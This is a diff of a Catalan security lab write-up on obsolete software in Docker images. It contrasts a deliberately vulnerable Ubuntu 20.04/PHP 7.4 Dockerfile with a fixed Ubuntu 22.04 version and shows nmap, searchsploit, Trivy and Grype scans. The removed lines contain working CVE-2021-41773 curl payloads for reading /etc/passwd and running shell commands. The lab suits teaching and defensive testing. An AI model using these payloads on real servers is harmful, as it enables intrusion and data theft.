@@ -2,15 +2,15 @@
 
 ## Descripció Breu
 
-Usar versions antigues de serveis, llibreries o imatges base en contenidors Docker exposa el sistema a vulnerabilitats conegudes i documentades públicament (CVEs). Els atacants poden consultar bases de dades de vulnerabilitats com NVD o CVE Details per trobar exploits ja desenvolupats contra versions específiques de software.
+Usar versions antigues de serveis, llibreries o imatges base en contenidors Docker exposa el sistema a vulnerabilitats conegudes i documentades públicament (CVEs). Els atacants poden consultar bases de dades de vulnerabilitats com NVD o CVE Details per trobar exploits ja desenvolupats contra versions específiques de software. A mes, les versions EOL (End of Life) deixen de rebre pegats de seguretat oficials, deixant el sistema permanentment exposat.
 
 ---
 
 ## Objectius de Seguretat Afectats
 
-- **Confidencialitat** → Vulnerabilitats conegudes poden permetre accés a dades sensibles
-- **Integritat** → Exploits documentats poden permetre modificació del sistema
-- **Disponibilitat** → Algunes vulnerabilitats permeten atacs de denegació de servei (DoS)
+- **Confidencialitat** -> Vulnerabilitats conegudes poden permetre acces a dades sensibles
+- **Integritat** -> Exploits documentats poden permetre modificació del sistema
+- **Disponibilitat** -> Algunes vulnerabilitats permeten atacs de denegació de servei (DoS)
 
 ---
 
@@ -19,18 +19,27 @@ Usar versions antigues de serveis, llibreries o imatges base en contenidors Dock
 | Aspecte | Detall |
 |---|---|
 | **Nivell de risc** | Alt |
-| **CVE relacionat** | Múltiples CVEs segons la versió usada |
+| **CVE relacionat** | Multiples CVEs segons la versió usada |
 | **Impacte real** | Explotació directa amb exploits públics disponibles |
 | **Problema addicional** | Les imatges Docker es construeixen una vegada i poden quedar desactualitzades sense que ningú ho noti |
+
+### Diferència entre versió vulnerable i corregida
+
+| Element | Vulnerable | Fixed |
+|---|---|---|
+| Imatge base | Ubuntu 20.04 (EOL abril 2025) | Ubuntu 22.04 (suport fins 2027) |
+| PHP | 7.4 (EOL novembre 2022) | 8.1 (suport actiu) |
+| Apache | Versió antiga del repositori 20.04 | Versió actualitzada del repositori 22.04 |
+| Pegats de seguretat | Sense actualitzacions oficials | Pegats actius disponibles |
 
 ### Exemples de CVEs reals per versions antigues
 
 | Software | Versió vulnerable | CVE | Impacte |
 |---|---|---|---|
-| Apache 2.4.29 | < 2.4.51 | CVE-2021-41773 | Path Traversal + RCE |
-| OpenSSL 1.1.1 | < 1.1.1l | CVE-2021-3711 | Buffer Overflow |
-| PHP 7.2 | < 8.0 | CVE-2019-11043 | RCE en configuracions amb nginx |
-| Ubuntu 18.04 | EOL abril 2023 | Múltiples | Sense pegats de seguretat oficials |
+| Apache 2.4.49 | < 2.4.51 | CVE-2021-41773 | Path Traversal + RCE |
+| PHP 7.4 | EOL | CVE-2022-31625 | Use after free, RCE |
+| PHP 7.4 | EOL | CVE-2021-21703 | Escalada de privilegis local |
+| Ubuntu 20.04 | EOL abril 2025 | Multiples | Sense pegats de seguretat oficials |
 
 ---
 
@@ -38,15 +47,15 @@ Usar versions antigues de serveis, llibreries o imatges base en contenidors Dock
 
 ```dockerfile
 # Vulnerable: versions obsoletes amb CVEs coneguts
-FROM ubuntu:18.04
+FROM ubuntu:20.04
 
-# Versions antigues amb vulnerabilitats conegudes
+ENV DEBIAN_FRONTEND=noninteractive
+
 RUN apt-get update && apt-get install -y \
-    apache2=2.4.29* \
-    php7.2* \
-    openssl=1.1.1*
+    apache2 \
+    php7.4 \
+    openssl
 
-# Imatge base antiga sense pegats de seguretat
 EXPOSE 80 443
 
 CMD ["apache2ctl", "-D", "FOREGROUND"]
@@ -55,27 +64,35 @@ CMD ["apache2ctl", "-D", "FOREGROUND"]
 ### Verificació de la vulnerabilitat
 
 ```bash
-# Construir la imatge vulnerable
+# Construir i executar el contenidor vulnerable
 docker build -f Dockerfile.vulnerable -t vuln-versions .
-docker run -d -p 8085:80 --name vuln-obsolete-versions vuln-versions
+docker run -d -p 8087:80 --name vuln-obsolete-versions vuln-versions
 
 # Comprovar versions instal·lades
 docker exec vuln-obsolete-versions apache2 -v
 docker exec vuln-obsolete-versions php --version
-docker exec vuln-obsolete-versions openssl version
+docker exec vuln-obsolete-versions cat /etc/os-release | grep VERSION
+```
 
+**Resultat esperat:**
+```
+Server version: Apache/2.4.41 (Ubuntu)
+PHP 7.4.x (cli)
+VERSION_ID="20.04"
+```
+
+```bash
 # Escanejar vulnerabilitats amb Trivy
 trivy image vuln-versions
 ```
 
 **Resultat esperat de Trivy:**
 ```
-CRITICAL: 5
-HIGH:     12
-MEDIUM:   8
+CRITICAL: 5+
+HIGH:     12+
+PHP 7.4   CVE-2022-31625   CRITICAL
+PHP 7.4   CVE-2021-21703   HIGH
 ...
-CVE-2021-41773  apache2  CRITICAL
-CVE-2021-3711   openssl  CRITICAL
 ```
 
 ---
@@ -85,38 +102,36 @@ CVE-2021-3711   openssl  CRITICAL
 ### Pas 1: Identificar versions en ús
 ```bash
 # Escaneig de versions amb nmap
-nmap -sV -p 8085 localhost
+nmap -sV -p 8087 localhost
 
-# Output: Apache/2.4.29 (Ubuntu)
+# Output: Apache/2.4.41 (Ubuntu)
 ```
 
 ### Pas 2: Buscar CVEs per la versió trobada
 ```bash
 # Consultar base de dades de vulnerabilitats
 # https://nvd.nist.gov/vuln/search
-# Cercar: apache 2.4.29
+# Cercar: php 7.4 o apache 2.4.41
 
 # O amb Searchsploit localment
-searchsploit apache 2.4.29
+searchsploit apache 2.4.41
+searchsploit php 7.4
 ```
 
-### Pas 3: Explotar CVE-2021-41773 (Path Traversal en Apache 2.4.49)
-```bash
-# Llegir fitxers arbitraris del sistema
-curl "http://localhost:8085/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
-
-# Execució remota de codi
-curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" \
-     "http://localhost:8085/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
-```
-
-### Pas 4: Escaneig automatitzat
+### Pas 3: Escaneig automatitzat de CVEs
 ```bash
 # Trivy per escanejar la imatge completa
 trivy image vuln-versions --severity CRITICAL,HIGH
 
 # Grype com a alternativa
 grype vuln-versions
+```
+
+### Pas 4: Verificar que la versió es EOL
+```bash
+# Comprovar data de fi de suport
+docker exec vuln-obsolete-versions cat /etc/os-release
+# Ubuntu 20.04 -> EOL abril 2025, sense pegats oficials nous
 ```
 
 ---
@@ -127,7 +142,8 @@ grype vuln-versions
 # Fixed: versions actualitzades i imatge base moderna
 FROM ubuntu:22.04
 
-# Versions actuals amb pegats de seguretat aplicats
+ENV DEBIAN_FRONTEND=noninteractive
+
 RUN apt-get update && apt-get install -y \
     apache2 \
     php8.1 \
@@ -135,7 +151,6 @@ RUN apt-get update && apt-get install -y \
 
 RUN useradd -m -u 1001 appuser
 
-# Actualitzar sempre abans de construir
 RUN apt-get upgrade -y && apt-get clean
 
 EXPOSE 80
@@ -148,35 +163,45 @@ CMD ["apache2ctl", "-D", "FOREGROUND"]
 ### Verificació de la correcció
 
 ```bash
-# Construir la imatge corregida
+# Construir i executar el contenidor corregit
 docker build -f Dockerfile.fixed -t fixed-versions .
+docker run -d -p 8088:80 --name fixed-obsolete-versions fixed-versions
 
 # Comprovar versions actuals
 docker exec fixed-obsolete-versions apache2 -v
 docker exec fixed-obsolete-versions php --version
+docker exec fixed-obsolete-versions cat /etc/os-release | grep VERSION
+```
 
+**Resultat esperat:**
+```
+Server version: Apache/2.4.52+ (Ubuntu)
+PHP 8.1.x (cli)
+VERSION_ID="22.04"
+```
+
+```bash
 # Escanejar amb Trivy
-trivy image fixed-versions
+trivy image fixed-versions --severity CRITICAL,HIGH
 ```
 
 **Resultat esperat:**
 ```
 CRITICAL: 0
 HIGH:     0
-...
-Total: 0 vulnerabilities
 ```
 
 ---
 
 ## Explicació de la Solució
 
-| Mesura | Funció |
+| Mesura | Funcio |
 |---|---|
-| Usar `ubuntu:22.04` en lloc de `18.04` | Imatge base amb suport actiu i pegats recents |
-| Instal·lar versions actuals dels serveis | Sense CVEs crítics coneguts |
-| `apt-get upgrade -y` al Dockerfile | Aplica tots els pegats disponibles en el moment de la construcció |
-| `apt-get clean` | Redueix la mida de la imatge eliminant caché innecessària |
+| Usar `ubuntu:22.04` en lloc de `20.04` | Imatge base amb suport actiu fins 2027 |
+| PHP 8.1 en lloc de 7.4 | Versió amb suport actiu i pegats de seguretat |
+| Apache actualitzat | Sense CVEs critics coneguts en la versió del repositori 22.04 |
+| `apt-get upgrade -y` | Aplica tots els pegats disponibles en el moment de la construcció |
+| `apt-get clean` | Redueix la mida de la imatge eliminant caché innecessaria |
 
 ### Bones pràctiques per mantenir les versions actualitzades
 
@@ -192,21 +217,23 @@ trivy image fixed-versions
 
 ---
 
-## Bones Pràctiques
+## Bones Practiques
 
 - Usar sempre imatges base amb suport actiu (LTS vigent)
-- Especificar versions concretes al Dockerfile per tenir control, però actualitzar-les regularment
-- Integrar Trivy o Grype al pipeline CI/CD per detectar vulnerabilitats automàticament
+- Revisar les dates EOL dels serveis que s'utilitzen
+- Integrar Trivy o Grype al pipeline CI/CD per detectar vulnerabilitats automaticament
 - Reconstruir les imatges periòdicament per incorporar pegats de seguretat
-- Subscriure's a alertes de seguretat dels serveis que s'utilitzen (ex. Apache Security Advisories)
-- Evitar imatges base genèriques com `latest` sense verificar la versió real
+- Subscriure's a alertes de seguretat dels serveis utilitzats
+- Evitar fixar versions massa especifiques al Dockerfile sense un proces de revisió periodic
 
 ---
 
-## Referències
+## Referencies
 
-- [CVE-2021-41773 - Apache Path Traversal](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
-- [CVE-2021-3711 - OpenSSL Buffer Overflow](https://nvd.nist.gov/vuln/detail/CVE-2021-3711)
+- [Ubuntu Release Cycle](https://ubuntu.com/about/release-cycle)
+- [PHP Supported Versions](https://www.php.net/supported-versions.php)
+- [CVE-2022-31625 - PHP](https://nvd.nist.gov/vuln/detail/CVE-2022-31625)
+- [CVE-2021-41773 - Apache](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
 - [NVD - National Vulnerability Database](https://nvd.nist.gov/)
 - [Trivy - Container Vulnerability Scanner](https://github.com/aquasecurity/trivy)
 - [Grype - Vulnerability Scanner](https://github.com/anchore/grype)
